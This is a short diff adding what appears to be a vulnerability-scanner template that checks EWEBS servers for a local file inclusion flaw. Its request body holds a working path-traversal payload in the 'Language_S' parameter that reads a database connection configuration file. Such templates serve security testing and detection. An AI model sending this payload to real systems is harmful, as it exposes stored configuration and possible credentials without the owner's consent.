@@ -1,0 +1,26 @@
+id: ewebs-arbitrary-file-reading
+name: EWEBS - Local File Inclusion
+severity: high
+confidence: tentative
+description: EWEBS is vulnerable to local file inclusion and allows remote attackers to disclose the content of locally stored
+  files via the 'Language_S' parameter supplied to the 'casmain.xgi' endpoint.
+reference: CWE-22
+tags:
+- ewebs
+- lfi
+- vuln
+requests:
+- method: POST
+  path: /casmain.xgi
+  matchers:
+  - type: body
+    words:
+    - '[Edition]'
+    - '[LocalInfo]'
+  - type: status
+    status:
+    - 200
+  condition: and
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: Language_S=../../Data/CONFIG/CasDbCnn.dat
